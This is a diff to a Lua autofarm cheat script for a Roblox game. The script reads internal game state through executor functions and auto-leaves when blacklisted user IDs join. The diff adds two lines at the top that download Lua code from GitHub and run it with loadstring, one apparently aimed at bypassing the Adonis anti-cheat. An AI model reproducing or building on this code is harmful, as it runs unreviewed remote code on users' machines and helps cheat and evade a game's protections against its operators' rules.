@@ -1,17 +1,5 @@
---[[
-    =============================
-    =         AUTOFARM          =
-    =============================
-    Struktur: 
-    1. Konstanta & Konfigurasi
-    2. Variabel Global & Service
-    3. Fungsi Utilitas
-    4. Fungsi Utama
-    5. Eksekusi/Loop utama
-]]--
-
--- 1. KONSTANTA & KONFIGURASI
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wSkidX/gataulaax/refs/heads/master/lowgfx.lua"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua'))()
 
 local MAIN = "jumgcx"
 local DUMMIES = {"rcmly", "ILoveDoingAssHard69", "dummy3"}
@@ -31,7 +19,6 @@ local BLACKLIST_USERIDS = {
     [7686777574] = true
 }
 
--- 2. VARIABEL GLOBAL & SERVICE
 local players = game:GetService("Players")
 local run_service = game:GetService("RunService")
 local replicated = game.ReplicatedStorage
@@ -39,7 +26,6 @@ local equip_event = replicated:WaitForChild("inventoryShared"):WaitForChild("com
 local local_player = players.LocalPlayer
 local camera = workspace.CurrentCamera
 
--- 3. FUNGSI UTILITAS
 local function get_quick_slots()
     for _, v in next, getgc(true) do
         if type(v) == "table" and rawget(v, "ItemUsed12345") then
@@ -105,7 +91,6 @@ local function check_and_leave()
     end
 end
 
--- 4. FUNGSI UTAMA
 local function auto_blacklist()
     players.PlayerAdded:Connect(function()
         check_and_leave()
